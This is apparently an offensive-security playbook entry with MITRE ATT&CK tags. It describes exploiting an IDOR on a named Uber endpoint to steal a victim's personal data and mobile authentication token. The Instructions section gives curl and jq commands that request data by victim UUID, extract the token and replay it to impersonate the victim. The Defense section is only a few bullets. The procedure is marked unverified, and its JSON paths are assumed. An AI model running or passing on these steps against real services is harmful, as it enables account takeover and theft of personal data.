---
id: p3c4d5e6-f7g8-9012-cdef-3456789012
tags:
  - information-disclosure
  - token-theft
  - account-takeover
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/jq]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-extract-response]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:25:22.974Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Credentials In Files]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Unsecured Credentials]]'
---
# Retrieve-Sensitive-User-Data-and-Token

## Summary

This procedure parses the response from the manipulated Uber API request to extract sensitive personal information and the mobile authentication token, enabling impersonation and full account access via mobile APIs.

## Description

After sending the IDOR request, the response contains JSON with user details (e.g., name, email) and a mobile auth token. Attackers extract these for use in mobile API calls to impersonate the victim, achieving account takeover. Requires JSON parsing tools; outcomes include disclosed PII and a usable token for further attacks like ride manipulation or driver access.

## Requirements

1. Successful response from prior IDOR manipulation
2. JSON parser like jq for extraction
3. Knowledge of Uber's mobile API structure for token usage

## Defense

Defensive measures and detection strategies:

- Avoid leaking auth tokens in web API responses; use short-lived, scoped tokens
- Encrypt sensitive data in transit and enforce HTTPS
- Implement data loss prevention (DLP) monitoring for PII in API logs

## Objectives

1. Extract personal identifiable information (PII) from the response
2. Isolate the mobile authentication token
3. Validate token for use in account takeover

## Instructions

### Step 1: Send Request and Capture Response

**Context**: Execute the POST to retrieve the full response containing sensitive data.

**Command** ([[commands/curl-extract-response]]):
```bash
curl -X POST 'https://bonjour.uber.com/marketplace/_rpc?rpc=getConsentScreenDetails' \
  -H 'Content-Type: application/json' \
  -d '{"userUuid": "victim-uuid-here"}' \
  -o response.json
```

> Saves the response to response.json. Expected output: File with JSON including user data and token fields.

### Step 2: Parse and Extract Data

**Context**: Use jq to pull specific fields like personal info and auth token.

**Command** ([[commands/jq-parse-uber]]):
```bash
jq '.user.personalInfo, .mobileAuthToken' response.json
```

> Assumes JSON structure; adjust paths as needed. Expected output: Displayed PII and token string, ready for copy-paste into mobile API requests.

### Step 3: Test Token for Impersonation

**Context**: Use the extracted token in a mobile API call to confirm takeover.

Example follow-up (not Uber-specific, but illustrative):
```bash
curl -H 'Authorization: Bearer extracted-token' 'https://mobile-api.uber.com/user/profile'
```

> Expected output: Victim's profile data, confirming access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Account Discovery]] Account Discovery
- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- [[Credentials In Files]] Credentials In Files

## Commands Used

- [[commands/curl-extract-response]]
- [[commands/jq-parse-uber]]

## Tools Used

- [[tools/curl]]
- [[tools/jq]]

## Tags

- [[information-disclosure]]
- [[token-theft]]
- [[account-takeover]]
